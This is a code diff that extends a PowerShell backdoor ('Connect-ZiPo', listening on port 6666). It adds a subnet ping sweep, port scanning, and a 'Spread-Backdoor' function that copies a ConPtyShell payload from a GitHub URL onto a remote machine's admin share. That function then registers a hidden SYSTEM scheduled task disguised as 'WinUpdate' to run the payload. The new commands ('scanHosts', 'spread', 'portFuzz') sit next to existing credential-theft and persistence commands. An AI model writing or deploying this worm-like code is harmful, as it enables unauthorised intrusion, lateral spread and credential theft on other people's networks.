@@ -5,6 +5,76 @@ function Connect-ZiPo {
     $port = 6666
     $currentDir = Get-Location
 
+
+    function Get-AliveHosts {
+    $subnet = ([System.Net.Dns]::GetHostAddresses(($env:COMPUTERNAME))[0].IPAddressToString -replace '\d+$', '')
+    1..254 | ForEach-Object {
+        $ip = "$subnet$_"
+        if (Test-Connection -ComputerName $ip -Count 1 -Quiet) {
+            $ip
+        }
+    }
+    }
+    
+
+    function Test-Port {
+    param($ip, $port)
+    try {
+        $tcp = New-Object Net.Sockets.TcpClient
+        $tcp.Connect($ip, $port)
+        $tcp.Close()
+        return $true
+    } catch {
+        return $false
+    }
+    } 
+
+    function Test-Ports {
+    param (
+        [string]$ip,
+        [int[]]$ports = @(21,22,23,25,53,80,110,135,139,143,443,445,3389,5985),
+        [int]$timeout = 1000
+    )
+
+    $results = @()
+    foreach ($port in $ports) {
+        try {
+            $client = New-Object System.Net.Sockets.TcpClient
+            $result = $client.BeginConnect($ip, $port, $null, $null)
+            $connected = $result.AsyncWaitHandle.WaitOne($timeout, $false)
+            $client.Close()
+
+            if ($connected) {
+                $results += "[OPEN] $ip:$port"
+            } else {
+                $results += "[CLOSED] $ip:$port"
+            }
+        }
+        catch {
+            $results += "[ERROR] $ip:$port $_"
+        }
+    }
+    return $results -join "`n"
+}
+
+
+
+    function Spread-Backdoor {
+    param($targetIP)
+
+    $remotePath = "\\$targetIP\C$\Users\Public\update.ps1"
+    $payloadURL = "https://raw.githubusercontent.com/zipo0/studytime-/main/Invoke-ConPtyShell.ps1"
+    Invoke-WebRequest -Uri $payloadURL -OutFile $remotePath
+
+    $cmd = "schtasks /Create /S $targetIP /RU SYSTEM /SC ONSTART /TN WinUpdate /TR 'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\update.ps1' /F"
+    Invoke-Expression $cmd
+}
+
+
+
+
+
+
     function Upload-File($path) {
         if (Test-Path $path) {
             $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path))
@@ -35,8 +105,6 @@ function Connect-ZiPo {
               /DELAY 0001:00 `
               /RL HIGHEST /RU "SYSTEM" /F
         }
-        
-
 
         return "[+] Persistence established successfully!"
     }
@@ -262,6 +330,35 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                     elseif ($cmd -eq "!creds") {
                         $response = Get-Credentials
                     }
+                    elseif ($cmd -eq "scanHosts") {
+                        $response = Get-AliveHosts
+                    }
+                    elseif ($cmd.StartsWith("spread")) {
+                        $args = $cmd.Split(" ")
+                        if ($args.Length -eq 2) {
+                            $target = $args[1]
+                            $response = Spread-Backdoor -targetIP $target
+                        } else {
+                            $response = "[USAGE] spread <targetIP>"
+                        }
+                    }
+                    elseif ($cmd.StartsWith("portFuzz")) {
+                        $args = $cmd.Split(" ")
+                    
+                        if ($args.Length -eq 2) {
+                            $ip = $args[1]
+                            $response = Test-Port -ip $ip
+                        }
+                        elseif ($args.Length -eq 3) {
+                            $ip = $args[1]
+                            $port = [int]$args[2]
+                            $response = Test-Port -ip $ip -ports @($port)
+                        }
+                        else {
+                            $response = "[USAGE] porttest <ip> [port]"
+                        }
+                    }
+
                     elseif ($cmd -eq "!die") {
                         $response = "[!] Self-destruct initiated..."
                         $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
